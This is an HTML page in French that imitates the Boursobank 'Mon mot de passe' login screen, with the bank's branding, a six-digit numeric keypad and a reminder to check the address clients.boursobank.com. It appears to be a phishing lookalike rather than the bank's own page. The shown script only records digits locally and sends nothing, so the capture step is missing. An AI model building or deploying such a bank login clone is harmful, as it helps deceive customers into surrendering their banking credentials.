<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boursobank - Mot de Passe</title>
    <style>
        /* Style général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Conteneur principal */
        .container {
            text-align: center;
        }

        /* Espace pour le logo principal */
        .top-logo {
            margin-bottom: 30px;
        }

        .top-logo img {
            max-width: 200px;
        }

        /* Formulaire */
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            padding: 20px;
            position: relative;
        }

        /* Bande rose */
        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
            margin-bottom: 10px;
        }

        /* Contenu */
        .form-content {
            padding: 10px;
        }

        .form-content img {
            width: 40px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 1.3rem;
            color: #003883;
            margin-bottom: 5px;
        }

        p {
            font-size: 0.85rem;
            color: #6c6c6c;
            margin-bottom: 10px;
        }

        /* Cercles de mot de passe */
        .password-dots {
            display: flex;
            justify-content: center;
            gap: 5px;
            margin: 10px 0;
        }

        .password-dots div {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #d1d1d1;
        }

        /* Clavier numérique */
        .numpad {
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 10px;
            margin: 20px 0;
        }

        .numpad button {
            background: #ffffff;
            border: 1px solid #c0c0c0;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        .numpad button:hover {
            background: #f0f0f0;
        }

        /* Bouton principal */
        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }

        .btn:hover {
            background: #e60064;
        }

        /* Pied de page */
        .footer-text {
            font-size: 0.8rem;
            color: #999;
            margin-top: 20px;
        }

        .footer-text a {
            color: #999;
            text-decoration: none;
        }

        .footer-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Boursobank">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

            <!-- Contenu du formulaire -->
            <div class="form-content">
                <!-- Logo secondaire -->
                <img src="instruments-logo-4677.png" alt="Logo secondaire">

                <!-- Titre -->
                <h1>Mon mot de passe</h1>
                <p>Veuillez toujours vérifier que vous êtes sur la bonne adresse</p>
                <p><strong>clients.boursobank.com</strong></p>

                <!-- Cercles -->
                <div class="password-dots" id="passwordDots">
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                </div>

                <!-- Clavier numérique -->
                <div class="numpad" id="numpad">
                    <button onclick="addDigit(1)">1</button>
                    <button onclick="addDigit(2)">2</button>
                    <button onclick="addDigit(3)">3</button>
                    <button onclick="addDigit(4)">4</button>
                    <button onclick="addDigit(5)">5</button>
                    <button onclick="addDigit(6)">6</button>
                    <button onclick="addDigit(7)">7</button>
                    <button onclick="addDigit(8)">8</button>
                    <button onclick="addDigit(9)">9</button>
                    <button onclick="addDigit(0)">0</button>
                </div>

                <!-- Bouton principal -->
                <button class="btn">Je me connecte</button>
                <p class="footer-text"><a href="#">Activer la vocalisation</a></p>
            </div>
        </div>
    </div>

    <script>
        const passwordDots = document.getElementById('passwordDots');
        let password = '';

        function addDigit(digit) {
            if (password.length < 6) {
                password += digit;
                const dots = passwordDots.querySelectorAll('div');
                dots[password.length - 1].style.background = '#000';
            }
        }
    </script>
</body>
</html>
